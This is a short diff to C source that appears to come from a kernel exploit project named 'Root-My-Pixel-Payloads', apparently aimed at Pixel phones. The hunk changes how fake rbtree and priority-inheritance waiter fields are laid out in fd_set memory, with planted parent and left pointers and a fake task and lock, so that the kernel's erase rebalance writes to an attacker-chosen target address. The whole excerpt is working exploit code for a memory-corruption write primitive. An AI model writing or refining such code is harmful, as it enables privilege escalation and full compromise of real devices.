@@ -444,14 +444,17 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   if (compact) {
     /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
      * the write value, children the write target; waiter->task is the
-     * payload fake_task (planted fields for the PI walk). */
+     * payload fake_task (planted fields for the PI walk). Value writes relink
+     * left-only at the target, or the erase rebalance walks the target page. */
+    uint64_t relink_pc = fake_right ? fake_right : fake_parent;
+    uint64_t relink_left = fake_right ? pselect_custom_target : fake_left;
     struct pselect_waiter_word words[] = {
-      {2, fake_right, "tree_pc"},
+      {2, relink_pc, "tree_pc"},
       {3, 0, "tree_right"},
-      {4, pselect_custom_target, "tree_left"},
-      {5, fake_right, "pi_pc"},
+      {4, relink_left, "tree_left"},
+      {5, relink_pc, "pi_pc"},
       {6, 0, "pi_right"},
-      {7, pselect_custom_target, "pi_left"},
+      {7, relink_left, "pi_left"},
       {8, fake_task, "task"},
       {9, fake_lock, "lock"},
       {10, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_prio"},
